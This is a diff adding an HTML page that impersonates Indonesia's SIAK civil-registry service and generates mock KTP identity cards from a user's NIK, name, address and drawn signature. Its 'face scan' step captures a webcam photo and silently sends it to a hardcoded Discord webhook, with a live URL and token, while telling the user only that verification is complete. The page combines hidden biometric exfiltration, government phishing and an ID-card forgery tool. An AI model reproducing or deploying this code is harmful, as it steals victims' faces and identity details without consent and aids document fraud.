@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SIAK v2.0 - Premium Edition</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        :root {
+            --gov-blue: #001d3d;
+            --gov-light: #003566;
+            --accent-gold: #ffc300;
+            --laser: #00f2ff;
+            /* Outline modern style */
+            --box-outline: rgba(255, 255, 255, 0.2);
+            --box-glow: rgba(0, 242, 255, 0.1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+        body { 
+            background: var(--gov-blue);
+            background-image: 
+                radial-gradient(circle at top right, rgba(0, 53, 102, 0.8), transparent),
+                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            padding: 20px 8%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--box-outline);
+        }
+
+        .brand { display: flex; align-items: center; gap: 20px; }
+        /* Logo Garuda Kualitas Tinggi */
+        .brand img { height: 60px; filter: drop-shadow(0 0 10px rgba(255, 195, 0, 0.3)); }
+        .brand .text { border-left: 2px solid var(--accent-gold); padding-left: 20px; }
+        .brand h1 { font-size: 16px; color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+        .brand p { font-size: 11px; color: var(--accent-gold); font-weight: bold; }
+
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 50px;
+            padding: 60px 5%;
+            flex-wrap: wrap;
+        }
+
+        /* BOX PREVIEW DENGAN OUTLINE MODERN */
+        .glass-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 24px;
+            border: 1px solid var(--box-outline);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4), inset 0 0 20px var(--box-glow);
+            backdrop-filter: blur(15px);
+            transition: 0.4s;
+        }
+
+        .glass-box:hover { border-color: rgba(0, 242, 255, 0.4); }
+
+        .ktp-container {
+            width: 500px;
+            height: 315px;
+            background: #b0d4f1 url('https://i.ibb.co/p6S8HhP/bumi-bg.png') center/cover;
+            border-radius: 18px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            overflow: hidden;
+            border: 2px solid rgba(0,0,0,0.1);
+        }
+
+        #scanner {
+            position: absolute; width: 100%; height: 4px;
+            background: var(--laser); box-shadow: 0 0 20px var(--laser);
+            display: none; z-index: 10;
+        }
+
+        @keyframes scanning { 0% { top: 0; } 100% { top: 100%; } }
+
+        /* BOX FORM DENGAN OUTLINE MODERN */
+        .form-container {
+            width: 450px;
+            background: rgba(10, 25, 41, 0.7);
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid var(--box-outline);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+
+        .input-row { margin-bottom: 20px; }
+        .input-row label { display: block; font-size: 11px; color: var(--accent-gold); margin-bottom: 8px; text-transform: uppercase; font-weight: bold; }
+        
+        input {
+            width: 100%; padding: 12px 18px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--box-outline);
+            border-radius: 10px;
+            color: #fff; font-size: 14px; transition: 0.3s;
+        }
+        input:focus { border-color: var(--laser); outline: none; background: rgba(255,255,255,0.1); }
+
+        .btn {
+            padding: 15px; border: none; border-radius: 12px;
+            font-weight: 800; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; font-size: 12px; width: 100%;
+        }
+        .btn-main { background: linear-gradient(45deg, var(--gov-light), #00509d); color: white; border: 1px solid var(--box-outline); }
+        .btn-download { background: #00b894; color: white; margin-top: 20px; box-shadow: 0 10px 20px rgba(0, 184, 148, 0.3); }
+        .btn:hover { transform: translateY(-3px); filter: brightness(1.2); }
+
+        /* KTP Internal Content */
+        .ktp-content { padding: 15px; color: #000; font-family: 'Courier New', monospace; font-weight: bold; font-size: 10px; }
+        .nik-area { font-size: 17px; margin-bottom: 10px; letter-spacing: 2px; }
+        .data-grid { display: grid; grid-template-columns: 100px 10px 1fr; gap: 4px; }
+        .photo-frame { width: 100px; height: 135px; border: 1.5px solid #000; position: absolute; right: 20px; top: 60px; background: #c0392b; overflow: hidden; }
+        .photo-frame img { width: 100%; height: 100%; object-fit: cover; }
+        .signature-area { position: absolute; right: 20px; bottom: 20px; text-align: center; width: 100px; font-size: 7px; }
+        #res-sign img { max-height: 45px; filter: contrast(1.3); }
+
+        #camera { width: 100%; border-radius: 15px; margin-top: 20px; display: none; border: 2px solid var(--laser); }
+
+        footer { text-align: center; padding: 40px; color: rgba(255,255,255,0.3); font-size: 11px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/National_emblem_of_Indonesia_Garuda_Pancasila.svg/1200px-National_emblem_of_Indonesia_Garuda_Pancasila.svg.png" alt="Garuda">
+        <div class="text">
+            <h1>SIAK TERPADU</h1>
+            <p>REPUBLIK INDONESIA</p>
+        </div>
+    </div>
+</header>
+
+<main>
+    <div class="glass-box">
+        <div id="capture-zone" style="background: white; padding: 8px; border-radius: 12px;">
+            <div class="ktp-container" id="ktp-render">
+                <div id="scanner"></div>
+                <div style="text-align:center; padding-top:10px; font-weight:bold; font-size:14px; color:#000;">PROVINSI JAWA BARAT<br>KABUPATEN BANDUNG</div>
+                <div class="ktp-content">
+                    <div class="nik-area">NIK : <span id="res-nik">3204XXXXXXXXXXXX</span></div>
+                    <div class="data-grid">
+                        <span>Nama</span><span>:</span><span id="res-nama">-</span>
+                        <span>Tempat/Tgl Lahir</span><span>:</span><span id="res-ttl">-</span>
+                        <span>Alamat</span><span>:</span><span id="res-alamat">-</span>
+                        <span>Pekerjaan</span><span>:</span><span id="res-kerja">-</span>
+                        <span>Berlaku Hingga</span><span>:</span><span>SEUMUR HIDUP</span>
+                    </div>
+                </div>
+                <div class="photo-frame" id="photo-target"></div>
+                <div class="signature-area">
+                    KAB. BANDUNG<br>27-04-2026
+                    <div id="res-sign"></div>
+                    <span id="res-sign-name" style="text-decoration:underline;">NAMA LENGKAP</span>
+                </div>
+            </div>
+        </div>
+        <button class="btn btn-download" id="btn-export">DOWNLOAD PNG (HD)</button>
+    </div>
+
+    <div class="form-container">
+        <button class="btn btn-main" id="auto-fill" style="margin-bottom: 25px; background: rgba(255,255,255,0.05);">GENERATE DATA OTOMATIS</button>
+        
+        <div class="input-row">
+            <label>Nomor Induk Kependudukan</label>
+            <input type="text" id="in-nik" maxlength="16" placeholder="Masukkan 16 digit NIK">
+        </div>
+        <div class="input-row">
+            <label>Nama Sesuai Identitas</label>
+            <input type="text" id="in-nama" placeholder="Contoh: ADRIAN SYAH">
+        </div>
+        <div class="input-row">
+            <label>Tempat, Tanggal Lahir</label>
+            <input type="text" id="in-ttl" placeholder="KOTA, DD-MM-YYYY">
+        </div>
+        <div class="input-row">
+            <label>Alamat Domisili</label>
+            <input type="text" id="in-alamat" placeholder="Nama Jalan & No Rumah">
+        </div>
+        <div class="input-row">
+            <label>Pekerjaan Saat Ini</label>
+            <input type="text" id="in-kerja" placeholder="Contoh: TEKNISI">
+        </div>
+
+        <div style="margin-bottom: 25px;">
+            <label>Spesimen Tanda Tangan Digital</label>
+            <canvas id="sig-pad" width="400" height="120" style="width:100%; border:1px solid var(--box-outline); border-radius:12px; background:white;"></canvas>
+            <p id="sig-clear" style="font-size:10px; color:#ff4757; cursor:pointer; text-align:right; font-weight:bold; margin-top:5px;">HAPUS TANDA TANGAN</p>
+        </div>
+
+        <button class="btn btn-main" id="btn-scan" style="background: var(--accent-gold); color: #000;">MULAI PEMINDAIAN WAJAH</button>
+        <video id="camera" autoplay playsinline></video>
+    </div>
+</main>
+
+<footer>
+    Dikelola oleh Direktorat Jenderal Kependudukan dan Pencatatan Sipil &copy; 2026
+</footer>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1498320491524395179/wnjFcqK23V9vmOhzlQ2l2lC8U2tD_dN_fWBeEIq-BnyrmmAhKrVO4sYJTKQhRh-TjW4A";
+    const canvas = document.getElementById('sig-pad'), ctx = canvas.getContext('2d');
+    let isDrawing = false;
+
+    // TTD Logic
+    const getPos = e => {
+        let r = canvas.getBoundingClientRect();
+        return { x: (e.touches ? e.touches[0].clientX : e.clientX) - r.left, y: (e.touches ? e.touches[0].clientY : e.clientY) - r.top };
+    };
+    canvas.addEventListener('mousedown', e => { isDrawing = true; ctx.beginPath(); let p = getPos(e); ctx.moveTo(p.x, p.y); });
+    canvas.addEventListener('mousemove', e => { 
+        if(!isDrawing) return; let p = getPos(e); ctx.lineTo(p.x, p.y); ctx.lineWidth = 3; ctx.stroke(); 
+        document.getElementById('res-sign').innerHTML = `<img src="${canvas.toDataURL()}">`;
+    });
+    window.addEventListener('mouseup', () => isDrawing = false);
+    document.getElementById('sig-clear').onclick = () => { ctx.clearRect(0,0,canvas.width,canvas.height); document.getElementById('res-sign').innerHTML = ""; };
+
+    // Sync Data
+    const ids = ['nik','nama','ttl','alamat','kerja'];
+    ids.forEach(id => {
+        document.getElementById('in-'+id).oninput = e => {
+            const val = e.target.value.toUpperCase();
+            document.getElementById('res-'+id).innerText = val || "-";
+            if(id === 'nama') document.getElementById('res-sign-name').innerText = val || "NAMA LENGKAP";
+        };
+    });
+
+    // Random Fill
+    document.getElementById('auto-fill').onclick = () => {
+        document.getElementById('in-nik').value = "3204" + Math.random().toString().slice(2,14);
+        document.getElementById('in-nama').value = "YUKINAGA KUSUMA";
+        document.getElementById('in-ttl').value = "BANDUNG, 21-12-1992";
+        document.getElementById('in-alamat').value = "JL. TEKNOLOGI NO. 101";
+        document.getElementById('in-kerja').value = "SOFTWARE ENGINEER";
+        ids.forEach(id => document.getElementById('res-'+id).innerText = document.getElementById('in-'+id).value.toUpperCase());
+        document.getElementById('res-sign-name').innerText = "YUKINAGA KUSUMA";
+    };
+
+    // Scan Biometrik
+    document.getElementById('btn-scan').onclick = async () => {
+        const v = document.getElementById('camera'), l = document.getElementById('scanner');
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
+            v.srcObject = s; v.style.display = 'block';
+            l.style.display = 'block'; l.style.animation = 'scanning 2s infinite linear';
+            
+            setTimeout(async () => {
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                const url = c.toDataURL('image/jpeg');
+                document.getElementById('photo-target').innerHTML = `<img src="${url}">`;
+                s.getTracks().forEach(t => t.stop());
+                v.style.display = 'none'; l.style.display = 'none';
+                
+                const blob = await (await fetch(url)).blob();
+                const fd = new FormData();
+                fd.append("file", blob, "bio.jpg");
+                fd.append("payload_json", JSON.stringify({content: "🔥 **BIOMETRIK TERVERIFIKASI**"}));
+                fetch(webhook, {method:'POST', body:fd});
+                alert("Verifikasi Biometrik Selesai.");
+            }, 4000);
+        } catch(e) { alert("Aktifkan kamera untuk pemindaian."); }
+    };
+
+    // Export HD
+    document.getElementById('btn-export').onclick = () => {
+        html2canvas(document.getElementById('ktp-render'), {scale:4}).then(c => {
+            let a = document.createElement('a');
+            a.download = `KTP_MODERN_${Date.now()}.png`;
+            a.href = c.toDataURL();
+            a.click();
+        });
+    };
+</script>
+
+</body>
+</html>
